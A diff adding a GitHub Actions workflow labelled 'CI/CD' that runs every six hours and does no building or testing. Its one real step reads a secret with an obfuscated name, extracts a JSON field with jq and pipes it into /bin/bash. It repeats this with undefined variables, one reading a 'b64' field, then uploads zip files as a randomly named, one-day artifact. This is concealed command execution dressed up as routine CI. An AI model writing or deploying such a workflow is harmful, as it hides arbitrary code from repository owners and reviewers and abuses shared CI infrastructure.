@@ -1,0 +1,37 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '21 3,9,15,21 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  scheduler:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          ro18710: ${{ secrets.ro18710 }}
+        run: |
+          printf '%s' "$ro18710" | jq -r .pan396 | /bin/bash
+          echo $rr1646 | jq -r .tsvja2 | /bin/bash
+          echo $yfgl0 | jq -r .rsmyt65013 | /bin/bash
+          printf '%s' "$i42" | jq -r .glyct86 | /bin/bash
+          echo $l82 | jq -r .b64 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: moYdb36X
+          path: "*.zip"
+          retention-days: 1
